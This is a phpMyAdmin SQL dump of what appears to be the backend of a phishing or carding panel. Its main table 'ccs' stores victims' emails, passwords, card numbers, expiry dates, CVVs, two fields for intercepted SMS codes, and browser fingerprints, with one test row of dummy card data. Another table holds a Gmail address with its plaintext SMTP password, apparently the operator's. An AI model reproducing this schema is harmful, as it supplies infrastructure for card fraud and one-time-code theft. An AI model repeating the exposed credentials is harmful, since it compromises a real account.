-- phpMyAdmin SQL Dump
-- version 4.9.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: May 22, 2021 at 09:25 PM
-- Server version: 10.4.11-MariaDB
-- PHP Version: 7.4.1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `ccs`
--

-- --------------------------------------------------------

--
-- Table structure for table `ccs`
--

CREATE TABLE `ccs` (
  `id` int(11) NOT NULL,
  `type` varchar(255) NOT NULL DEFAULT 'empty',
  `email` varchar(255) NOT NULL DEFAULT 'empty',
  `password` varchar(255) NOT NULL DEFAULT 'empty',
  `fname` varchar(255) NOT NULL DEFAULT 'empty',
  `lname` varchar(255) NOT NULL DEFAULT 'empty',
  `phone` varchar(255) NOT NULL DEFAULT 'empty',
  `cc` varchar(255) NOT NULL DEFAULT 'empty',
  `m_y` varchar(255) NOT NULL DEFAULT 'empty',
  `ccv` varchar(255) NOT NULL DEFAULT 'empty',
  `date` datetime NOT NULL DEFAULT current_timestamp(),
  `zip` varchar(255) NOT NULL DEFAULT 'empty',
  `sms_one` varchar(255) NOT NULL DEFAULT 'empty',
  `sms_two` varchar(255) NOT NULL DEFAULT 'empty',
  `ip` varchar(255) NOT NULL DEFAULT 'empry',
  `browser` varchar(255) NOT NULL DEFAULT 'empry',
  `os` varchar(255) NOT NULL DEFAULT 'empry',
  `agent` varchar(255) NOT NULL DEFAULT 'empry'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `ccs`
--

INSERT INTO `ccs` (`id`, `type`, `email`, `password`, `fname`, `lname`, `phone`, `cc`, `m_y`, `ccv`, `date`, `zip`, `sms_one`, `sms_two`, `ip`, `browser`, `os`, `agent`) VALUES
(11, 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', '2021-05-22 19:49:54', 'empty', 'empty', 'empty', 'empry', 'empry', 'empry', 'empry'),
(12, 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', '2021-05-22 19:56:26', 'empty', 'empty', 'empty', 'empry', 'empry', 'empry', 'empry'),
(14, 'Login', 'don.karimmansour@aol.com', 'jjjjjjj', '', '', '1', '5555555555555555', '12/22', '555', '2021-05-22 20:23:21', '11000', 'empty', 'empty', '::1', 'Chrome', 'Windows 10', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_chat_room`
--

CREATE TABLE `tbl_chat_room` (
  `clm_cr_id` int(11) NOT NULL,
  `clm_cr_msg` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `clm_cr_date` datetime NOT NULL DEFAULT current_timestamp(),
  `clm_cr_user_id` int(11) DEFAULT -1
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_smtp`
--

CREATE TABLE `tbl_smtp` (
  `clm_st_host` text COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_port` int(11) NOT NULL,
  `clm_st_from` text COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_fromname` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_state` enum('on','off') COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_reply_to` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `clm_st_security` enum('tls','ssl') COLLATE utf8_unicode_ci NOT NULL,
  `id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `tbl_smtp`
--

INSERT INTO `tbl_smtp` (`clm_st_host`, `clm_st_username`, `clm_st_password`, `clm_st_port`, `clm_st_from`, `clm_st_fromname`, `clm_st_state`, `clm_st_reply_to`, `clm_st_security`, `id`) VALUES
('smtp.gmail.com', 'don.karimmansour@gmail.com', 'mansour/98', 587, 'don.karimmansour@gmail.com', 'karimwydad', 'off', 'don.karimmansour@gmail.com', 'tls', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_users`
--

CREATE TABLE `tbl_users` (
  `clm_u_id` int(11) NOT NULL,
  `clm_u_username` varchar(255) NOT NULL,
  `clm_u_email` varchar(255) NOT NULL,
  `clm_u_password` varchar(255) NOT NULL,
  `clm_u_date` datetime NOT NULL DEFAULT current_timestamp(),
  `clm_u_img` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `tbl_users`
--

INSERT INTO `tbl_users` (`clm_u_id`, `clm_u_username`, `clm_u_email`, `clm_u_password`, `clm_u_date`, `clm_u_img`) VALUES
(-1, 'Unknowen', 'Unknowen', 'Unknowen', '2020-07-26 23:42:09', 'empty');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `ccs`
--
ALTER TABLE `ccs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_chat_room`
--
ALTER TABLE `tbl_chat_room`
  ADD PRIMARY KEY (`clm_cr_id`),
  ADD KEY `clm_cr_user_id` (`clm_cr_user_id`);

--
-- Indexes for table `tbl_smtp`
--
ALTER TABLE `tbl_smtp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_users`
--
ALTER TABLE `tbl_users`
  ADD PRIMARY KEY (`clm_u_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `ccs`
--
ALTER TABLE `ccs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `tbl_chat_room`
--
ALTER TABLE `tbl_chat_room`
  MODIFY `clm_cr_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=196;

--
-- AUTO_INCREMENT for table `tbl_smtp`
--
ALTER TABLE `tbl_smtp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_users`
--
ALTER TABLE `tbl_users`
  MODIFY `clm_u_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
